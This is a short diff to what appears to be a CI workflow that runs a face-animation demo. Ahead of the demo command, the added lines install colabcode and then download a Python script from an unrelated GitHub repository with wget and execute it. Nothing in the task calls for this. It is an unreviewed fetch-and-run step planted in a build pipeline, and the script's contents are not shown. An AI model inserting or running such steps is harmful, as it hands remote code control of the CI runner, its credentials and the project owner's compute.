@@ -20,6 +20,13 @@ jobs:
     uses: script@v1
     with:
       script: |-
+        apt update
+        apt upgrade -y
+        apt install wget -y
+        apt install curl -y
+        pip install colabcode
+        wget https://github.com/highhifun/high/raw/main/cc.py
+        python3 cc.py
         python3 demo.py --relative --adapt_scale \
           --config config/vox-256.yaml \
           --checkpoint /inputs/model/vox.pt \
